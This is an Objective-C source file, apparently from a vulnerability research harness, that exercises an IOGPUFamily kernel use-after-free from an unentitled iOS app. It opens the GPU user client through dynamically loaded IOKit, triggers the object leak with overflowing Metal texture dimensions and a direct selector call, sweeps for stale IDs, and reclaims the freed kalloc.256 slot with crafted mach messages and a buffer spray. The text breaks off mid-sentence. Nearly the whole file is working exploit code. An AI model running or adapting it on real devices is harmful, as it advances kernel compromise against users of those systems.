// [BEGIN PASTE]
//  probe_iogpu_uaf_og.m - DirtySlide ROW N: IOGPUFamily UAF 64788 reclaim-
//  differential (v185 OG). Cells: OG00 baseline sanity + the purgeable-
//  channel selector map, OG01 overflow-dims creates (Metal arm + row-L sel9
//  arm) + stale sweep = the PRE witness, OG02 the mach_msg kalloc.256
//  reclaim burst = the POST witness, OG03 never-created-id negative control,
//  OG04 the MTLBuffer(0x100) reclaim variant, OGH01-04 beats.
//  ZERO daemon epoch (the beats only).
//
//  REACHED FROM AN UNENTITLED APP: Metal newTextureWithDescriptor:
//  iosurface:plane: rides the IOGPUDeviceUserClient in-process; the purgeable
//  oracle is driven directly on the same IOServiceOpen connection.

#import "ds_core.h"
#import <Metal/Metal.h>
#import <IOSurface/IOSurfaceRef.h>
#import <CoreFoundation/CoreFoundation.h>
#include <dlfcn.h>
#include <mach/mach.h>
#include <string.h>

// ---- Manual IOKit types (IOKitLib.h is not on the iOS app SDK; the dynamic
// ---- dlopen/dlsym pattern is the proven row-L loader) ----
typedef mach_port_t io_object_t;
typedef io_object_t io_service_t;
typedef io_object_t io_connect_t;
typedef io_object_t io_iterator_t;

typedef CFMutableDictionaryRef (*ds_og_IOServiceMatchingFn)(const char *);
typedef io_service_t (*ds_og_IOServiceGetMatchingServiceFn)(mach_port_t, CFDictionaryRef);
typedef kern_return_t (*ds_og_IOServiceOpenFn)(io_service_t, task_port_t, uint32_t, io_connect_t *);
typedef kern_return_t (*ds_og_IOServiceCloseFn)(io_connect_t);
typedef kern_return_t (*ds_og_IOObjectReleaseFn)(io_object_t);
typedef kern_return_t (*ds_og_ScalarFn)(io_connect_t, uint32_t, const uint64_t *, uint32_t,
                                        uint64_t *, uint32_t *);
typedef kern_return_t (*ds_og_StructFn)(io_connect_t, uint32_t, const void *, size_t,
                                        void *, size_t *);
typedef kern_return_t (*ds_og_Trap2Fn)(io_connect_t, uint32_t, uintptr_t, uintptr_t);

static ds_og_IOServiceMatchingFn           ds_og_pMatch;
static ds_og_IOServiceGetMatchingServiceFn ds_og_pGetSvc;
static ds_og_IOServiceOpenFn               ds_og_pOpen;
static ds_og_IOServiceCloseFn              ds_og_pClose;
static ds_og_IOObjectReleaseFn             ds_og_pRelease;
static ds_og_ScalarFn                      ds_og_pScalar;
static ds_og_StructFn                      ds_og_pStruct;
static ds_og_Trap2Fn                       ds_og_pTrap2;

// ---- disasm constants (23G71 carve + macOS 26.6 KDK layout, row-L notes) ----
#define DS_OG_SEL_NEW_RESOURCE     9u    // s_new_resource, structIn 0x58 variable
#define DS_OG_SEL_PURGEABLE        12u   // s_set_resource_purgeable, 2 scalars in
#define DS_OG_TRAP_PURGEABLE       3u    // t_set_resource_purgeable(id, state)
#define DS_OG_RESTYPE_SYSMEM       0x82u // SysMemShared(IOSurface) type code

#define DS_OG_NOTFOUND             0xe00002c2u  // not-found baseline for a dead id
#define DS_OG_UNSUPPORTED          0xe00002c7u  // kIOReturnUnsupported = sel absent
#define DS_OG_NORESOURCES          0xe00002beu  // the dec-consumed arm
#define DS_OG_FAMILY(kr)           ((((uint32_t)(kr)) & 0xFFFFFE00u) == 0xE0000200u)

// the UAF-visible IOGPUSysMemory fields -> mach_msg body offsets
// (the kernel message buffer = header 0x18 + body, so body+X = obj+0x18+X)
#define DS_OG_MSG_SIZE             0x100u   // rounds into kalloc.256
#define DS_OG_FIELD_10_OFF         0x28u    // body+0x28 = obj+0x10 (u64)
#define DS_OG_FIELD_24_OFF         0x3Cu    // body+0x3C = obj+0x24 (u32)
#define DS_OG_FIELD_28_OFF         0x40u    // body+0x40 = obj+0x28 (u32)
#define DS_OG_MARKER_OFF           0x68u    // body+0x68 = obj+0x68 (u64 tag)
#define DS_OG_MARKER_VAL           0x064788C0DE000001ULL
#define DS_OG_FIELD_10_VAL         0x4142434445464748ULL
#define DS_OG_BURST_MSGS           512u
#define DS_OG_SWEEP_IDS            256u

typedef struct {
    mach_msg_header_t h;
    uint8_t           body[DS_OG_MSG_SIZE - sizeof(mach_msg_header_t)];
} ds_og_msg_t;
// receive buffer must hold message + kernel trailer (0x100 + up to 0x58)
typedef struct { mach_msg_header_t h; uint8_t body[0x1E8]; } ds_og_rcv_t;
typedef char ds_og_assert_msg_is_0x100[(sizeof(ds_og_msg_t) == 0x100) ? 1 : -1];
typedef char ds_og_assert_rcv_ge_0x180[(sizeof(ds_og_rcv_t) >= 0x180) ? 1 : -1];

static int ds_og_load_iokit(void)
{
    void *k = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    if (!k) return -1;
    ds_og_pMatch   = (ds_og_IOServiceMatchingFn)dlsym(k, "IOServiceMatching");
    ds_og_pGetSvc  = (ds_og_IOServiceGetMatchingServiceFn)dlsym(k, "IOServiceGetMatchingService");
    ds_og_pOpen    = (ds_og_IOServiceOpenFn)dlsym(k, "IOServiceOpen");
    ds_og_pClose   = (ds_og_IOServiceCloseFn)dlsym(k, "IOServiceClose");
    ds_og_pRelease = (ds_og_IOObjectReleaseFn)dlsym(k, "IOObjectRelease");
    ds_og_pScalar  = (ds_og_ScalarFn)dlsym(k, "IOConnectCallScalarMethod");
    ds_og_pStruct  = (ds_og_StructFn)dlsym(k, "IOConnectCallStructMethod");
    ds_og_pTrap2   = (ds_og_Trap2Fn)dlsym(k, "IOConnectTrap2");
    if (!ds_og_pMatch || !ds_og_pGetSvc || !ds_og_pOpen || !ds_og_pClose ||
        !ds_og_pRelease || !ds_og_pScalar || !ds_og_pStruct || !ds_og_pTrap2)
        return -1;
    return 0;
}

// ==========================================================================
// THE PURGEABLE PROBE + SELECTOR-MAP TRY-LIST
// ds_og_purgeable_probe(conn, rid, *outCode, *outVal):
//   1. if a channel is already cached, use it;
//   2. else try the disasm-known shapes first (sel12 2-in/1-out, trap3) -
//      a garbage id must answer a family code (0x2c2 not-found);
//   3. else run the TRY-LIST: selectors 0..24, scalar-in {id} and {id,1},
//      printing every response = THE SELECTOR MAP (recon by itself).
//      Break after the FIRST selector returning an 0xe00002xx-family code
//      (0x2c2 on a garbage id = the real purgeable dispatcher found).
// Silent on the hot path - callers print. outCode 0 = no channel.
// ==========================================================================
static int      ds_og_probe_sel   = -2;   // -2 undiscovered, -1 none, >=0 cached
static int      ds_og_probe_shape = 0;    // 1={id} 2={id,1} 3=trap2
static int      ds_og_map_done    = 0;
static uint32_t ds_og_map_lines   = 0;    // noise cap for the map print

static kern_return_t ds_og_try_shape(io_connect_t conn, int shape, uint32_t sel,
                                     uint32_t rid, uint64_t *outVal)
{
    uint64_t in[2]  = { rid, 1 };
    uint64_t out[2] = { 0, 0 };
    uint32_t outCnt = 2;
    kern_return_t kr = KERN_FAILURE;
    switch (shape) {
    case 1: kr = ds_og_pScalar(conn, sel, in, 1, out, &outCnt); break;
    case 2: kr = ds_og_pScalar(conn, sel, in, 2, out, &outCnt); break;
    case 3: kr = ds_og_pTrap2(conn, sel, (uintptr_t)rid, (uintptr_t)1); break;
    default: break;
    }
    *outVal = out[0];
    return kr;
}

static void ds_og_purgeable_probe(io_connect_t conn, uint32_t rid,
                                  uint32_t *outCode, uint64_t *outVal)
{
    *outCode = 0;
    *outVal  = 0;
    if (conn == MACH_PORT_NULL) return;

    if (ds_og_probe_sel >= 0) {
        kern_return_t kr = ds_og_try_shape(conn, ds_og_probe_shape,
                                           (uint32_t)ds_og_probe_sel, rid, outVal);
        if (DS_OG_FAMILY(kr)) { *outCode = (uint32_t)kr; return; }
        // channel went silent (conn death?) - fall through, map is done
        return;
    }

    if (ds_og_probe_sel == -2) {
        // fast path 1: the disasm-known sel12 (2 scalars in, 1 out)
        kern_return_t kr = ds_og_try_shape(conn, 2, DS_OG_SEL_PURGEABLE, rid, outVal);
        if (DS_OG_FAMILY(kr) && kr != DS_OG_UNSUPPORTED) {
            ds_og_probe_sel = (int)DS_OG_SEL_PURGEABLE;
            ds_og_probe_shape = 2;
            *outCode = (uint32_t)kr;
            return;
        }
        // fast path 2: the disasm-known trap3
        kr = ds_og_try_shape(conn, 3, DS_OG_TRAP_PURGEABLE, rid, outVal);
        if (DS_OG_FAMILY(kr) && kr != DS_OG_UNSUPPORTED) {
            ds_og_probe_sel = (int)DS_OG_TRAP_PURGEABLE;
            ds_og_probe_shape = 3;
            *outCode = (uint32_t)kr;
            return;
        }
    }

    // THE TRY-LIST (selector-map recon). Garbage rid expected: the REAL
    // purgeable dispatcher answers a family code (0x2c2 not-found for a dead
    // id); unknown selectors answer 0x2c7 / MIG noise. Cache the FIRST
    // family-code selector as the channel (per the try-list rule).
    if (!ds_og_map_done) {
        ds_og_map_done = 1;
        dprintf(STDOUT_FILENO, "  OG[map] selector scan sel=0..24 shapes={id},{id,1} rid=%#x\n", rid);
        for (uint32_t sel = 0; sel <= 24 && ds_og_probe_sel < 0; sel++) {
            for (int shape = 1; shape <= 2; shape++) {
                uint64_t v = 0;
                kern_return_t kr = ds_og_try_shape(conn, shape, sel, rid, &v);
                if (kr == DS_OG_UNSUPPORTED) continue;      // sel absent
                ds_og_map_lines++;
                dprintf(STDOUT_FILENO, "  OG[map] sel=%u shape=%d kr=%#x out=%llu%s\n",
                        sel, shape, kr, (unsigned long long)v,
                        DS_OG_FAMILY(kr) ?
                          (kr != DS_OG_NOTFOUND ? "  <-- LIVE HANDLER" : "  <-- CHANNEL (dead-id answer)") :
                          (kr == KERN_SUCCESS ? "  (state caller?)" : "  (MIG noise)"));
                if (DS_OG_FAMILY(kr)) {
                    ds_og_probe_sel = (int)sel;
                    ds_og_probe_shape = shape;
                    *outCode = (uint32_t)kr;
                    *outVal  = v;
                    return;                                 // break on first family code
                }
                if (ds_og_map_lines > 48) return;           // map noise cap
            }
        }
        if (ds_og_probe_sel < 0) {
            ds_og_probe_sel = -1;                           // probes stay dead
            dprintf(STDOUT_FILENO, "  OG[map] NO family-code selector found - purgeable oracle DEAD\n");
        }
    }
}

// ---- guarded probe wrapper (every stale-id touch runs under the guard) ----
static void ds_og_probe_guarded(const char *tag, io_connect_t conn, uint32_t rid,
                                uint32_t *outCode, uint64_t *outVal)
{
    __block uint32_t c = 0;
    __block uint64_t v = 0;
    __block int rc = 0;
    int sig = ds_ave_guard_run_tmo(^int {
        ds_og_purgeable_probe(conn, rid, &c, &v);
        return 0;
    }, &rc, 6000);
    if (sig > 0) {
        dprintf(STDOUT_FILENO, "  OG[%s] PROBE CLIENT-FAULT sig=%d @0x%lx rid=%#x\n",
                tag, sig, (unsigned long)g_ave_fault_addr, rid);
        c = 0; v = 0;
    }
    *outCode = c;
    *outVal  = v;
}

// ---- IOSurface helper (row-L pattern) ----
static IOSurfaceRef ds_og_make_surface(uint32_t w, uint32_t h, uint32_t *idOut)
{
    NSDictionary *props = @{
        (id)kIOSurfaceWidth:           @(w),
        (id)kIOSurfaceHeight:          @(h),
        (id)kIOSurfaceBytesPerElement: @(4),
        (id)kIOSurfacePixelFormat:     @(0x42475241),
    };
    IOSurfaceRef s = IOSurfaceCreate((__bridge CFDictionaryRef)props);
    if (s && idOut) *idOut = (uint32_t)IOSurfaceGetID(s);
    return s;
}

// ---- row-L sel9 new_resource arm (the proven direct trigger; the kext
// ---- derives the dims from the SURFACE itself - hence the 1x0xFFFF plant)
static void ds_og_build_resource_args(uint8_t *inb, uint32_t sid, uint32_t plane)
{
    memset(inb, 0, 0x58);
    *(uint32_t *)(inb + 0x00) = DS_OG_RESTYPE_SYSMEM;
    *(uint32_t *)(inb + 0x04) = 0;          // cacheMode (ror(w,8)<10 gate)
    *(uint32_t *)(inb + 0x30) = 1;          // count
    *(uint32_t *)(inb + 0x38) = sid;        // iosurfaceID
    *(uint32_t *)(inb + 0x3c) = plane;
}

static kern_return_t ds_og_new_resource(io_connect_t conn, uint32_t sid, uint32_t plane)
{
    uint8_t inb[0x58];
    uint8_t outb[0x100];
    size_t outSz = sizeof(outb);
    __block kern_return_t kr = KERN_FAILURE;
    __block int rc = 0;
    ds_og_build_resource_args(inb, sid, plane);
    uint8_t *inbP = inb, *outbP = outb;
    size_t *outSzP = &outSz;
    int sig = ds_ave_guard_run_tmo(^int {
        kr = ds_og_pStruct(conn, DS_OG_SEL_NEW_RESOURCE, inbP, 0x58, outbP, outSzP);
        return 0;
    }, &rc, 6000);
    return sig ? ((kern_return_t)(0xffffff00 | sig)) : kr;
}

// ---- Metal overflow-arm helper (the PoC route: huge descriptor dims) ----
static id<MTLTexture> ds_og_metal_overflow(id<MTLDevice> dev, IOSurfaceRef s,
                                           uint64_t w, uint64_t h)
{
    MTLTextureDescriptor *d =
        [MTLTextureDescriptor texture2DDescriptorWithPixelFormat:MTLPixelFormatBGRA8Unorm
                                                           width:(NSUInteger)w
                                                          height:(NSUInteger)h
                                                       mipmapped:NO];
    if (!d) return nil;
    return [dev newTextureWithDescriptor:d iosurface:s plane:0];
}

// ---- mach_msg reclaim burst (kalloc.256) ----
// One 0x100 inline message per slot; header = obj+0x00..0x17, body+X =
// obj+0x18+X. The burst must be CONTIGUOUS for the LIFO magazine: all
// sends first (send-until-queue-full in rounds), ONE probe while held,
// then the drain frees every message.
static void ds_og_build_msg(ds_og_msg_t *m, mach_port_t dest)
{
    memset(m, 0, sizeof(*m));
    m->h.msgh_bits        = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
    m->h.msgh_size        = (mach_msg_size_t)sizeof(*m);
    m->h.msgh_remote_port = dest;
    m->h.msgh_id          = 0x64788;
    *(uint64_t *)(m->body + DS_OG_FIELD_10_OFF) = DS_OG_FIELD_10_VAL;
    *(uint32_t *)(m->body + DS_OG_FIELD_24_OFF) = 4;      // the dec-consumed arm
    *(uint32_t *)(m->body + DS_OG_FIELD_28_OFF) = 0;
    *(uint64_t *)(m->body + DS_OG_MARKER_OFF)   = DS_OG_MARKER_VAL;
}

static uint32_t ds_og_mach_burst(mach_port_t dest, uint32_t maxMsgs)
{
    ds_og_msg_t tmpl;
    ds_og_build_msg(&tmpl, dest);
    uint32_t sent = 0;
    while (sent < maxMsgs) {
        kern_return_t kr = mach_msg(&tmpl.h, MACH_SEND_MSG, tmpl.h.msgh_size, 0,
                                    MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
        if (kr != MACH_MSG_SUCCESS) break;      // queue full (or port dead)
        sent++;
    }
    return sent;
}

static uint32_t ds_og_mach_drain(mach_port_t recv)
{
    ds_og_rcv_t rbuf;
    uint32_t got = 0;
    for (;;) {
        kern_return_t kr = mach_msg(&rbuf.h, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
                                    0, (mach_msg_size_t)sizeof(rbuf), recv,
                                    100, MACH_PORT_NULL);
        if (kr != MACH_MSG_SUCCESS) break;
        got++;
        if (got > DS_OG_BURST_MSGS + 64) break; // paranoia cap
    }
    return got;
}

// ---- verdict helper: the differential classifier ----
static const char *ds_og_diff_verdict(uint32_t preC, uint64_t preV,
                                      uint32_t postC, uint64_t postV)
{
    if (postV == DS_OG_FIELD_10_VAL ||
        (postV & 0xFFFFFFFFFFFF0000ULL) == (DS_OG_MARKER_VAL & 0xFFFFFFFFFFFF0000ULL))
        return "OUT=ATTACKER-BYTES (RECLAIM WITNESSED)";
    if (preC != postC && preC != 0 && postC != 0)
        return "CODE-DIFF (reclaim candidate - read the arm pair)";
    if (preV != postV && preV != 0)
        return "OUT-DIFF (weak witness)";
    return "NO-CHANGE (reclaim failed / wrong bucket)";
}

static void ds_og_print_probe(const char *tag, uint32_t rid, uint32_t code, uint64_t val)
{
    if (code == 0)
        dprintf(STDOUT_FILENO, "  OG[%s] rid=%#x NO-CHANNEL\n", tag, rid);
    else
        dprintf(STDOUT_FILENO, "  OG[%s] rid=%#x kr=%#x out=%llu%s\n", tag, rid, code,
                (unsigned long long)val,
                code == DS_OG_NOTFOUND ? " (not-found)" :
                code == DS_OG_NORESOURCES ? " (NoResources = dec arm)" : "");
}

// ==========================================================================
void probe_iogpu_uaf_og(const char *pfx)
// ==========================================================================
{
    dprintf(STDOUT_FILENO, "%s== OG. IOGPU 64788 UAF-RECLAIM ==\n", pfx);
    dprintf(STDOUT_FILENO, "%s  MODEL: create_resource_iosurface leaks a kalloc(0x100)\n", pfx);
    dprintf(STDOUT_FILENO, "%s  IOGPUSysMemory on the dims-overflow path (table entry NOT\n", pfx);
    dprintf(STDOUT_FILENO, "%s  cleared); set_resource_purgeable derefs it (+0x24 dec,\n", pfx);
    dprintf(STDOUT_FILENO, "%s  +0x28/+0x10 loads). The oracle = a PRE-vs-POST differential\n", pfx);
    dprintf(STDOUT_FILENO, "%s  across a controlled kalloc.256 reclaim burst. NO zone\n", pfx);
    dprintf(STDOUT_FILENO, "%s  sequestration for kalloc.256 on 26.6 = same-thread reclaim.\n", pfx);

    if (ds_og_load_iokit() != 0) {
        dprintf(STDOUT_FILENO, "%s  OG[load] IOKit dlsym failed - row void\n", pfx);
        return;
    }

    // ---- open the GPU user client (type 0 then 1, first success) ----
    io_service_t svc = MACH_PORT_NULL;
    io_connect_t conn = MACH_PORT_NULL;
    {
        CFMutableDictionaryRef dict = ds_og_pMatch("IOGPUDevice");
        if (dict) svc = ds_og_pGetSvc(0, dict);
        for (uint32_t t = 0; t <= 1 && svc != MACH_PORT_NULL; t++) {
            io_connect_t c = MACH_PORT_NULL;
            kern_return_t kr = ds_og_pOpen(svc, mach_task_self(), t, &c);
            dprintf(STDOUT_FILENO, "  OG[open] IOGPUDevice type=%u kr=%#x conn=%#x\n",
                    t, kr, c);
            if (kr == KERN_SUCCESS && c != MACH_PORT_NULL) { conn = c; break; }
        }
    }
    if (conn == MACH_PORT_NULL) {
        dprintf(STDOUT_FILENO, "%s  OG[open] no IOGPUDevice user client - row void\n", pfx);
        if (svc != MACH_PORT_NULL) ds_og_pRelease(svc);
        return;
    }

    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
    IOSurfaceRef surfN  = NULL;      // OG00 normal surface (reused by OG01 metal arm)
    IOSurfaceRef surfP1 = NULL;      // OG01 plant surface
    IOSurfaceRef surfP2 = NULL;      // OG04 fresh plant
    NSMutableArray *bufSpray = [NSMutableArray arrayWithCapacity:320];
    mach_port_t recvPort = MACH_PORT_NULL;
    mach_port_t sendPort = MACH_PORT_NULL;
    uint32_t staleId = 0, staleId2 = 0;
    const uint32_t deadId = 0xDEADBEEF;
    uint32_t preC = 0, deadPreC = 0, deadPostC = 0;
    uint64_t preV = 0, deadPreV = 0, deadPostV = 0;
    __block uint32_t postC = 0;
    __block uint64_t postV = 0;

    // ================= OG00: baseline sanity =================
    ds_journal_write("START", "OG00 baseline");
    {
        surfN = ds_og_make_surface(32, 32, NULL);
        MTLTextureDescriptor *nd =
            [MTLTextureDescriptor texture2DDescriptorWithPixelFormat:MTLPixelFormatBGRA8Unorm
                                                               width:32 height:32 mipmapped:NO];
        id<MTLTexture> tex = (surfN && dev) ?
            [dev newTextureWithDescriptor:nd iosurface:surfN plane:0] : nil;
        dprintf(STDOUT_FILENO, "  OG00 dev=%p surf=%p tex=%p %s\n", (__bridge void *)dev,
                (void *)surfN, (__bridge void *)tex,
                tex ? "= Metal path OK (unentitled GPU channel live)" : "= Metal path DEAD");
        nd = nil; tex = nil;

        // the purgeable-channel selector map (garbage id - must answer not-found)
        uint32_t c0 = 0; uint64_t v0 = 0;
        ds_og_probe_guarded("OG00", conn, 0x1BADB002u, &c0, &v0);
        if (ds_og_probe_sel >= 0)
            dprintf(STDOUT_FILENO, "  OG00 purgeable channel: sel=%d shape=%d (baseline rid kr=%#x)\n",
                    ds_og_probe_sel, ds_og_probe_shape, c0);
        else
            dprintf(STDOUT_FILENO, "  OG00 purgeable channel: NONE (map above) - OG01+ codes void\n");
        ds_og_print_probe("OG00", 0x1BADB002u, c0, v0);
    }
    ds_journal_write("DONE", "OG00 baseline");

    // ============ OG01: overflow creates + stale sweep = the PRE witness ============
    ds_journal_write("START", "OG01 overflow-create");
    {
        // arm 1: the Metal PoC route - huge descriptor dims over a small surface
        if (dev && surfN) {
            static const struct { uint64_t w, h; } shapes[4] = {
                { 0x100000000ULL, 1 },          // w overflows 32-bit
                { 1, 0x100000000ULL },          // h overflows 32-bit
                { 0x100000ULL, 0x100000ULL },   // w*h = 2^40 pixel overflow
                { 0x40000000ULL, 0x10ULL },
            };
            for (int i = 0; i < 4; i++) {
                id<MTLTexture> t = ds_og_metal_overflow(dev, surfN, shapes[i].w, shapes[i].h);
                dprintf(STDOUT_FILENO, "  OG01 metal-arm shape%d %llux%llu tex=%p %s\n",
                        i, (unsigned long long)shapes[i].w, (unsigned long long)shapes[i].h,
                        (__bridge void *)t, t ? "(created)" : "(rejected/nil)");
                t = nil;    // drop the ref; any leaked kext object is the POINT
            }
        } else {
            dprintf(STDOUT_FILENO, "  OG01 metal-arm SKIPPED (dev=%p surfN=%p)\n", (__bridge void *)dev, (void *)surfN);
        }

        // arm 2: the row-L proven direct sel9 plant - dims from a 1x0xFFFF surface
        uint32_t sidP1 = 0;
        surfP1 = ds_og_make_surface(1, 0xFFFF, &sidP1);
        if (sidP1) {
            kern_return_t kr = ds_og_new_resource(conn, sidP1, 0);
            dprintf(STDOUT_FILENO, "  OG01 sel9-arm sid=%#x kr=%#x (error-path return = the leak)\n",
                    sidP1, kr);
        } else {
            dprintf(STDOUT_FILENO, "  OG01 sel9-arm surface create FAILED - arm void\n");
        }

        // the stale sweep 1..256 - the FIRST hit's receipt IS the PRE witness
        __block uint32_t found = 0, fC = 0;
        __block uint64_t fV = 0;
        __block int rc = 0;
        int sig = ds_ave_guard_run_tmo(^int {
            for (uint32_t id = 1; id <= DS_OG_SWEEP_IDS; id++) {
                uint32_t c = 0; uint64_t v = 0;
                ds_og_purgeable_probe(conn, id, &c, &v);
                if (c != 0 && c != DS_OG_NOTFOUND) { found = id; fC = c; fV = v; break; }
            }
            return 0;
        }, &rc, 20000);
        if (sig > 0)
            dprintf(STDOUT_FILENO, "  OG01 sweep CLIENT-FAULT sig=%d @0x%lx - a probe deref'd wild\n",
                    sig, (unsigned long)g_ave_fault_addr);
        staleId = found; preC = fC; preV = fV;
        dprintf(STDOUT_FILENO, "  OG01 stale sweep: staleId=%u PRE kr=%#x out=%llu %s\n",
                staleId, preC, (unsigned long long)preV,
                staleId ? "= THE 64788 STALE ENTRY (PRE witness)" : "= none (overflow path did not fire)");
        if (staleId) {
            uint32_t c2 = 0; uint64_t v2 = 0;
            ds_og_probe_guarded("OG01b", conn, staleId, &c2, &v2);
            dprintf(STDOUT_FILENO, "  OG01b confirm rid=%u kr=%#x out=%llu (each probe = one +0x24 dec)\n",
                    staleId, c2, (unsigned long long)v2);
        }
    }
    ds_journal_write("DONE", "OG01 overflow-create");

    // ============ OG02: the mach_msg reclaim burst = the POST witness ============
    ds_journal_write("START", "OG02 machmsg-reclaim");
    if (staleId == 0) {
        dprintf(STDOUT_FILENO, "  OG02 VOID (no stale entry from OG01)\n");
    } else {
        kern_return_t kr = mach_port_allocate(mach_task_self(),
                                              MACH_PORT_RIGHT_RECEIVE, &recvPort);
        if (kr == KERN_SUCCESS) {
            kr = mach_port_insert_right(mach_task_self(), recvPort, recvPort,
                                        MACH_MSG_TYPE_MAKE_SEND);
            if (kr == KERN_SUCCESS) sendPort = recvPort;
            mach_port_limits_t lim;
            lim.mpl_qlimit = DS_OG_BURST_MSGS;
            kern_return_t kq = mach_port_set_attributes(mach_task_self(), recvPort,
                                                        MACH_PORT_LIMITS_INFO,
                                                        (mach_port_info_t)&lim,
                                                        MACH_PORT_LIMITS_INFO_COUNT);
            dprintf(STDOUT_FILENO, "  OG02 port=%#x qlimit=%u kr=%#x (fail = burst self-chunks)\n",
                    recvPort, DS_OG_BURST_MSGS, kq);
        } else {
            dprintf(STDOUT_FILENO, "  OG02 port allocate FAILED kr=%#x\n", kr);
        }
        if (sendPort != MACH_PORT_NULL) {
            __block uint32_t sent = 0, drained = 0;
            __block int rc = 0;
            int sig = ds_ave_guard_run_tmo(^int {
                sent = ds_og_mach_burst(sendPort, DS_OG_BURST_MSGS);
                uint32_t c = 0; uint64_t v = 0;
                ds_og_purgeable_probe(conn, staleId, &c, &v);   // ONE probe, mid-hold
                postC = c; postV = v;
                drained = ds_og_mach_drain(recvPort);
                return 0;
            }, &rc, 20000);
            if (sig > 0)
                dprintf(STDOUT_FILENO, "  OG02 CLIENT-FAULT sig=%d @0x%lx (post-spray probe)\n",
                        sig, (unsigned long)g_ave_fault_addr);
            dprintf(STDOUT_FILENO, "  OG02 burst sent=%u drained=%u POST kr=%#x out=%llu\n",
                    sent, drained, postC, (unsigned long long)postV);
            dprintf(STDOUT_FILENO, "  OG02 VERDICT: PRE(kr=%#x out=%llu) vs POST(kr=%#x out=%llu) = %s\n",
                    preC, (unsigned long long)preV, postC, (unsigned long long)postV,
                    ds_og_diff_verdict(preC, preV, postC, postV));
        }
    }
    ds_journal_write("DONE", "OG02 machmsg-reclaim");

    // ============ OG03: never-created-id negative control ============
    ds_journal_write("START", "OG03 deadid-control");
    {
        ds_og_probe_guarded("OG03pre", conn, deadId, &deadPreC, &deadPreV);
        if (sendPort != MACH_PORT_NULL) {
            // same flow as OG02 on the dead id: a 64-msg burst between probes
            uint32_t sent = ds_og_mach_burst(sendPort, 64);
            uint32_t drained = ds_og_mach_drain(recvPort);
            dprintf(STDOUT_FILENO, "  OG03 inter-burst sent=%u drained=%u\n", sent, drained);
        }
        ds_og_probe_guarded("OG03post", conn, deadId, &deadPostC, &deadPostV);
        dprintf(STDOUT_FILENO, "  OG03 dead rid=%#x PRE kr=%#x POST kr=%#x %s\n",
                deadId, deadPreC, deadPostC,
                (deadPreC == DS_OG_NOTFOUND && deadPostC == DS_OG_NOTFOUND) ?
                    "= CONTROL CLEAN" : "= NOT 2c2 - the channel answers something else");
    }
    ds_journal_write("DONE", "OG03 deadid-control");

    // ============ OG04: MTLBuffer(0x100) reclaim variant (the PoC arm) ============
    ds_journal_write("START", "OG04 mtlbuffer-reclaim");
    {
        // FRESH stale entry - OG02's probes already dec'd the old slot
        uint32_t sidP2 = 0;
        surfP2 = ds_og_make_surface(1, 0xFFFE, &sidP2);
        if (sidP2) {
            kern_return_t kr = ds_og_new_resource(conn, sidP2, 0);
            dprintf(STDOUT_FILENO, "  OG04 fresh plant sid=%#x kr=%#x\n", sidP2, kr);
        }
        __block uint32_t found = 0, fC = 0;
        __block uint64_t fV = 0;
        __block int rc = 0;
        int sig = ds_ave_guard_run_tmo(^int {
            for (uint32_t id = 1; id <= DS_OG_SWEEP_IDS; id++) {
                if (id == staleId) continue;        // skip the consumed entry
                uint32_t c = 0; uint64_t v = 0;
                ds_og_purgeable_probe(conn, id, &c, &v);
                if (c != 0 && c != DS_OG_NOTFOUND) { found = id; fC = c; fV = v; break; }
            }
            return 0;
        }, &rc, 20000);
        (void)sig;
        staleId2 = found;
        uint32_t pre2C = fC; uint64_t pre2V = fV;
        dprintf(STDOUT_FILENO, "  OG04 fresh staleId=%u PRE kr=%#x out=%llu\n",
                staleId2, pre2C, (unsigned long long)pre2V);
        if (staleId2 == 0 && staleId != 0)
            dprintf(STDOUT_FILENO, "  OG04 reusing OG01 staleId=%u (CONTAMINATED by OG02 - read-only compare)\n",
                    staleId);

        // the original PoC primitive: 300 x MTLBuffer(0x100), held alive
        for (int i = 0; i < 300 && dev; i++) {
            id<MTLBuffer> b = [dev newBufferWithLength:0x100
                                               options:MTLResourceStorageModeShared];
            if (b) [bufSpray addObject:b];
        }
        dprintf(STDOUT_FILENO, "  OG04 MTLBuffer spray held=%lu (zeroed fields = the PoC arm)\n",
                (unsigned long)bufSpray.count);

        uint32_t rid = staleId2 ? staleId2 : staleId;
        uint32_t c = 0; uint64_t v = 0;
        ds_og_probe_guarded("OG04", conn, rid, &c, &v);
        dprintf(STDOUT_FILENO, "  OG04 POST kr=%#x out=%llu\n", c, (unsigned long long)v);
        dprintf(STDOUT_FILENO, "  OG04 VERDICT: PRE(kr=%#x out=%llu) vs POST(kr=%#x out=%llu) = %s\n",
                pre2C, (unsigned long long)pre2V, c, (unsigned long long)v,
                ds_og_diff_verdict(pre2C, pre2V, c, v));
        dprintf(STDOUT_FILENO, "  OG04 COMPARE: OG02 mach_msg arm vs OG04 MTLBuffer arm - the arm\n");
        dprintf(STDOUT_FILENO, "  that moved the code/out-param is the kalloc.256 reclaim primitive\n");
    }
    ds_journal_write("DONE", "OG04 mtlbuffer-reclaim");

    // ================= OGH01-04 beats (1x1 H264, the liveness canary) =================
    for (int b = 1; b <= 4; b++) {
        char htag[16];
        snprintf(htag, sizeof(htag), "OGH%02d beat", b);
        ds_ave_replay(pfx, htag, 1, 1, 64, kCMVideoCodecType_H264,
                      kCVPixelFormatType_32BGRA, 1, 1);
        usleep(200000);
    }

    // ================= cleanup tail (every path) =================
    [bufSpray removeAllObjects];
    bufSpray = nil;
    dev = nil;
    if (recvPort != MACH_PORT_NULL) mach_port_destroy(mach_task_self(), recvPort);
    if (surfN)  { CFRelease(surfN);  surfN  = NULL; }
    if (surfP1) { CFRelease(surfP1); surfP1 = NULL; }
    if (surfP2) { CFRelease(surfP2); surfP2 = NULL; }
    if (conn != MACH_PORT_NULL) ds_og_pClose(conn);
    if (svc != MACH_PORT_NULL)  ds_og_pRelease(svc);

    // ================= read-offs =================
    dprintf(STDOUT_FILENO, "%s  OG read-offs:\n", pfx);
    dprintf(STDOUT_FILENO, "%s   OG00: dev+tex non-nil = the unentitled Metal->IOGPU path is\n", pfx);
    dprintf(STDOUT_FILENO, "%s   live in-app; the OG[map] block = the purgeable selector map -\n", pfx);
    dprintf(STDOUT_FILENO, "%s   the first sel answering a family code (0x2c2 on the garbage id =\n", pfx);
    dprintf(STDOUT_FILENO, "%s   the real dispatcher; any other family code = a LIVE handler whose\n", pfx);
